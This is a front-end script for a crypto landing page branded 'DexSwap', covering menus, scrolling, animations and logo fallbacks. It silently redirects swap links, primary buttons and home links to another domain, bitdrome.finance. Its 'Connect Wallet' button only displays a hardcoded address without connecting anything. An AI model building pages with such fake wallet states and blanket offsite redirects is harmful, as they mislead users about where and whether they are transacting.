/**
 * DexSwap Landing Page Script
 * Handles navigation, animations, and UI interactions
 */

document.addEventListener('DOMContentLoaded', function() {
    // ======================
    // Mobile Menu Functionality
    // ======================
    const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
    const nav = document.querySelector('nav ul');
    
    if (mobileMenuBtn && nav) {
        mobileMenuBtn.addEventListener('click', function() {
            nav.classList.toggle('show');
            this.innerHTML = nav.classList.contains('show') ? 
                '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
        });
    }

    // Close mobile menu when clicking on a link
    document.querySelectorAll('nav ul li a').forEach(link => {
        link.addEventListener('click', () => {
            if (window.innerWidth <= 768) {
                nav.classList.remove('show');
                mobileMenuBtn.innerHTML = '<i class="fas fa-bars"></i>';
            }
        });
    });

    // ======================
    // Navigation Handling
    // ======================
    const handleNavigation = (e) => {
        e.preventDefault();
        // Redirect to bitdrome swap interface
        window.location.href = 'https://bitdrome.finance/swap/';
    };

    // All elements that should redirect to swap
    const swapRedirectElements = [
        ...document.querySelectorAll('a[href="/swap"], a[href^="/swap#"]'),
        ...document.querySelectorAll('a.btn-primary'),
        ...document.querySelectorAll('a[href="/"]')
    ];

    // Add event listeners to all relevant elements
    swapRedirectElements.forEach(element => {
        element.addEventListener('click', handleNavigation);
    });

    // ======================
    // Smooth Scrolling
    // ======================
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        if (anchor.getAttribute('href') === '#') return;
        
        anchor.addEventListener('click', function(e) {
            // Don't interfere with swap links
            if (this.classList.contains('btn-primary') || 
                this.href.includes('/swap')) {
                return;
            }

            e.preventDefault();
            
            const targetId = this.getAttribute('href');
            const targetElement = document.querySelector(targetId);
            
            if (targetElement) {
                window.scrollTo({
                    top: targetElement.offsetTop - 80,
                    behavior: 'smooth'
                });
                
                // Update URL without page reload
                if (history.pushState) {
                    history.pushState(null, null, targetId);
                } else {
                    location.hash = targetId;
                }
            }
        });
    });

    // ======================
    // Connect Wallet Button
    // ======================
    const connectWalletBtn = document.getElementById('connect-wallet');
    if (connectWalletBtn) {
        // Only show on desktop
        if (window.innerWidth <= 768) {
            connectWalletBtn.style.display = 'none';
        } else {
            connectWalletBtn.addEventListener('click', function(e) {
                e.preventDefault();
                this.textContent = '0x7f...3a4b';
                this.classList.add('connected');
            });
        }
    }

    // ======================
    // Animations
    // ======================
    const animateOnScroll = function() {
        const elements = document.querySelectorAll('.feature-card, .chain-item, .stat-item');
        const windowHeight = window.innerHeight;
        
        elements.forEach(element => {
            const elementPosition = element.getBoundingClientRect().top;
            
            if (elementPosition < windowHeight - 100) {
                element.classList.add('animate');
            }
        });
    };

    // Initialize animations
    window.addEventListener('load', () => {
        animateOnScroll();
        
        // Add pre-animate class to elements
        document.querySelectorAll('.feature-card, .chain-item, .stat-item')
            .forEach(el => el.classList.add('pre-animate'));
    });

    window.addEventListener('scroll', animateOnScroll);

    // ======================
    // Chain Logo Fallbacks
    // ======================
    document.querySelectorAll('.chain-item img').forEach(img => {
        img.addEventListener('error', function() {
            // Try loading from alternative source
            const chainName = this.alt.toLowerCase().replace(' ', '-');
            this.src = `https://cryptologos.cc/logos/${chainName}-logo.png?v=025`;
            
            // Final fallback to placeholder
            this.addEventListener('error', () => {
                this.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTEyLDJBMTAsMTAgMCAwLDAgMiwxMkExMCwxMCAwIDAsMCAxMiwyMkExMCwxMCAwIDAsMCAyMiwxMkExMCwxMCAwIDAsMCAxMiwyTTEyLDQuOEMxNi40LDQuOCAxOS44LDguMiAxOS44LDEyLjJDMTkuOCwxNi4xIDE2LjQsMTkuNSAxMiwxOS41QzcuNiwxOS41IDQuMiwxNi4xIDQuMiwxMi4yQzQuMiw4LjIgNy42LDQuOCAxMiw0LjhNMTIuMSwxMC4zTDkuNSwxMy4xTDcuMiwxMC45TDQuOCwxMy4zTDEwLjYsMTlMMTkuMiwxMC41TDE2LjgsOC4xTDEyLjEsMTIuOEw5LjUsMTAuMkwxMi4xLDcuOUwxMi4xLDEwLjNaIi8+PC9zdmc+';
            });
        });
    });

    // ======================
    // Responsive Adjustments
    // ======================
    function handleResponsiveChanges() {
        // Toggle wallet button visibility
        if (connectWalletBtn) {
            connectWalletBtn.style.display = window.innerWidth <= 768 ? 'none' : 'flex';
        }
    }

    // Run on resize
    window.addEventListener('resize', handleResponsiveChanges);
    
    // Initial check
    handleResponsiveChanges();
});
